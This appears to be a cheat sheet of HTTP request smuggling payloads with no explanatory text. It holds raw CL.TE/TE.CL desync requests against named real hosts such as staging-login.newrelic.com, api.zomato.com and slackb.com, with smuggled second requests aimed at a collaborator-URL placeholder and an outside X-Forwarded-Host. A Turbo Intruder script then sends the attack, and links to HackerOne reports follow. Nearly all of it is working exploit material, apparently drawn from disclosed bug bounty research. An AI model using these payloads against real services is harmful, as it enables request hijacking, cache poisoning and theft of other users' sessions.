```
TPOST /login HTTP/1.1
Host: staging-login.newrelic.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1547216493639-15775; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; ei_client_id=5c39274682f6eb000fa6d52a; _golden_gate_session=bkRPMUZ3STBrY0laZG0zemY1Umg5cFVhcWpNaGpvZWN2T0tOM3hWL2p2UVdaVTJLZFh5NkJtQnZHV2FIR3hnZWpKaWFvM2F2WkRab3hjWTd5b3A1T2dOY20zWWNQaFhZNWVRZXFuRkFwU3l1YVZMdm1JSW9pSGd0UnRicnRBUVdhaGg3UXJQTFJ0c3ZkMHRyaHZqNjYreCt4dWUwVlp1UTdrSVFpSEx6akVITjRWWGNrSUR5NGdIdG80UnFJS2xpVTNlU1BpK0hjWEZJMVF1R2I4RlNNeUdicVdTWFVDQnBlQ0NQSXdNYXFJM2lDTWc5VldLOTJ3N1A3Wll5RytpZVNya2J1WTdTNUZ5UVFRNk5KVmt2TmNudlU3WDFQMVJPbGtkWXJJWXd1YjA9LS1MeU1EbTkrZ29qVVo2VkNUMDhnMVp3PT0%3D--155cef8a5f5d2bcb69b1d1952af040a3479aeacb; _gat=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Transfer-Encoding: chunked
Transfer-Encoding: foo

3e
return_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F
0

GET / HTTP/1.1
Host: staging-login.newrelic.com:123
X-Forwarded-Host: skeletonscribe.net
Content-Length: 10

x=
```
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```
```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET https://**YOUR_COLLAB_URL**/ HTTP/1.1
X: X
```
Turbo Intruder Code:
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://staging-login.newrelic.com:443',
                           concurrentConnections=5,
                           requestsPerConnection=5,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST /login HTTP/1.1
Host: staging-login.newrelic.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1547216493639-15775; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; ei_client_id=5c39274682f6eb000fa6d52a; _golden_gate_session=bkRPMUZ3STBrY0laZG0zemY1Umg5cFVhcWpNaGpvZWN2T0tOM3hWL2p2UVdaVTJLZFh5NkJtQnZHV2FIR3hnZWpKaWFvM2F2WkRab3hjWTd5b3A1T2dOY20zWWNQaFhZNWVRZXFuRkFwU3l1YVZMdm1JSW9pSGd0UnRicnRBUVdhaGg3UXJQTFJ0c3ZkMHRyaHZqNjYreCt4dWUwVlp1UTdrSVFpSEx6akVITjRWWGNrSUR5NGdIdG80UnFJS2xpVTNlU1BpK0hjWEZJMVF1R2I4RlNNeUdicVdTWFVDQnBlQ0NQSXdNYXFJM2lDTWc5VldLOTJ3N1A3Wll5RytpZVNya2J1WTdTNUZ5UVFRNk5KVmt2TmNudlU3WDFQMVJPbGtkWXJJWXd1YjA9LS1MeU1EbTkrZ29qVVo2VkNUMDhnMVp3PT0%3D--155cef8a5f5d2bcb69b1d1952af040a3479aeacb; _gat=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Transfer-Encoding: chunked
Transfer-Encoding: foo

3e
return_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F
0

GET / HTTP/1.1
Host: staging-login.newrelic.com:123
X-Forwarded-Host: skeletonscribe.net
Content-Length: 10

x='''
    engine.queue(attack)
    engine.start()

```

Refrences:
```
1- https://hackerone.com/reports/726773

2- https://hackerone.com/reports/498052

3- https://hackerone.com/reports/771666
```
